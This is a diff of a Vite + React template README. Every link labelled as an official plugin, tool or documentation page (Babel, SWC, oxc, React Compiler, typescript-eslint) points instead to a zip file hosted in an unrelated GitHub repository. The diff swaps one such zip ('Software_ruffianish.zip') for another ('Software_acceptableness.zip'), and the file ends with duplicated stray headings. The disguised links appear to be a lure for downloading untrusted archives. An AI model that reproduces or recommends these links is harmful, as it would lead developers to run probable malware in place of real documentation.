@@ -4,15 +4,15 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip) uses [Babel](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip) (or [oxc](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip) when used in [rolldown-vite](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip)) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip) uses [SWC](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip) uses [Babel](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip) (or [oxc](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip) when used in [rolldown-vite](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip)) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip) uses [SWC](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip) for Fast Refresh
 
 ## React Compiler
 
-The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip).
+The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip).
 
 ## Expanding the ESLint configuration
 
-If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/backend/Software_ruffianish.zip) in your project.
+If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/Pelumi-oloruntegbe/kingsway/main/public/Software_acceptableness.zip) in your project.
 # kinsway
 # kingsway
